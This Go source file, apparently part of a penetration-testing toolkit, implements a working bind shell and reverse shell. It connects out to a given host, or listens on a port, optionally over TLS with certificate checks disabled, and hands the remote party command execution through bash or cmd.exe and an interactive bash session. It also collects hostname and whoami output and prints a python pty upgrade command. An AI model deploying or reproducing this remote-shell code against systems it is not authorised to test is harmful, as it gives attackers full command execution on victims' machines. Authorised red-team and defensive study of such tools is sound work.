package gopshell

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"

	"github.com/hophouse/gop/utils/logger"
)

type ConnInterface interface {
	Write(b []byte) (n int, err error)
	Read(b []byte) (n int, err error)
	Close() error
}

// Run a reverse of bind shell
func RunShellCmd(mode string, host string, port string, ssltls bool) {
	logger.Println("[+] Start the shell as mode :", mode)

	switch mode {
	case "bind":
		bindShell(host, port)
	case "reverse":
		reverseShell(host, port, ssltls)
	default:
		log.Fatal("Unknown mode")
	}
}

func bindShell(host string, port string) {
	address := fmt.Sprintf("%s:%s", host, port)
	logger.Println("[+] Binding to ", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Println(err)
		}
		logger.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
		go runAgent(conn)
	}
}

func reverseShell(host string, port string, ssltls bool) {
	address := fmt.Sprintf("%s:%s", host, port)
	logger.Println("[+] Address ", address)

	var conn ConnInterface
	var err error

	if ssltls {
		config := &tls.Config{
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", address, config)
	} else {
		conn, err = net.Dial("tcp", address)
	}
	if err != nil {
		log.Fatal("[!] Unable to dial the address")
	}
	defer conn.Close()

	runAgent(conn)
}

func runAgent(conn ConnInterface) {
	for {
		_, err := conn.Write([]byte("$> "))
		if err != nil {
			logger.Printf("Error Writin \"$> \" : %s\n", err)
		}

		input := make([]byte, 4096)
		n, _ := conn.Read(input)
		if n == 0 {
			break
		}
		command := string(input[:n])
		command = strings.TrimSpace(command)

		switch command {
		case "help":
			displayHelp(conn)
		case "shell":
			_, err := conn.Write([]byte("[+] Run shell command\n"))
			if err != nil {
				logger.Printf("Error Writin \"[+] Run shell command\" : %s\n", err)
			}
			runShell(conn)
		case "exit":
			_, err := conn.Write([]byte("Exiting this agent\n"))
			if err != nil {
				logger.Printf("Error Writin \"Exiting the agent\" : %s\n", err)
			}

			conn.Close()
		default:
			if strings.HasPrefix(command, "exec") {
				runCommand(conn, command[len("exec "):])
			}

			_, err := conn.Write([]byte("Unknow commad\n"))
			if err != nil {
				logger.Printf("Error Writin \"Unknow command\" : %s\n", err)
			}
		}
	}
}

func displayHelp(conn ConnInterface) {
	_, _ = conn.Write([]byte("[+] Help\n"))
	_, _ = conn.Write([]byte("\t- help\tDisplay this help\n"))
	_, _ = conn.Write([]byte("\t- shell\tRun a shell\n"))
	_, _ = conn.Write([]byte("\t- exec\texecute command given in parameters\n"))
	_, _ = conn.Write([]byte("\t- exit\texit\n"))
}

func runCommand(conn ConnInterface, input string) {
	var out []byte
	var err error

	if runtime.GOOS == "windows" {
		out, err = exec.Command("cmd.exe", "/c", input).Output()
	} else {
		out, err = exec.Command("/bin/bash", "-c", input).Output()
	}

	if err != nil {
		_, _ = conn.Write([]byte("[!] Erreur running command\n"))
		return
	}

	_, err = conn.Write([]byte(out))
	if err != nil {
		logger.Printf("Error writing bytes : %s\n", err)
	}
}

func runShell(conn ConnInterface) {
	r, w := io.Pipe()

	cmd := exec.Command("/bin/bash", "-i")

	go func() {
		_, err := io.Copy(conn, r)
		if err != nil {
			logger.Printf("Error during io.Copy : %s\n", err)
		}
	}()

	// Get System information
	hostname, _ := exec.Command("hostname").Output()
	whoami, _ := exec.Command("whoami").Output()

	logger.Fprintf(w, "\n[+] Hostname : %s", hostname)
	logger.Fprintf(w, "[+] Whoami : %s", whoami)

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
		path, err := exec.LookPath("powershell")
		if err == nil {
			logger.Fprintf(w, "\n[+] Powershell is installed\n[+] Run : %s\n\n", path)
		}
	} else {
		path, err := exec.LookPath("python")
		if err == nil {
			logger.Fprintf(w, "\n[+] Python is installed\n[+] Run : %s %s\n\n", path, "-c \"import pty; pty.spawn('/bin/bash')\"")
		}
	}

	cmd.Stdin = conn
	cmd.Stdout = w
	cmd.Stderr = w

	if err := cmd.Run(); err != nil {
		logger.Println(err)
	}
}
